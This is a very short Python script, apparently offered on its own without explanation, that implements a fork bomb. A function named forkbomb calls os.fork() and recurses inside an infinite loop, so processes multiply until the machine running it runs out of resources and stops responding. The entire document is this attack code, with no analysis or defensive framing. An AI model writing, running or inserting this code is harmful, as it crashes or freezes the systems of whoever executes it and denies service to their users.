import os
while True:
    def forkbomb():
        os.fork()
        forkbomb()
    forkbomb()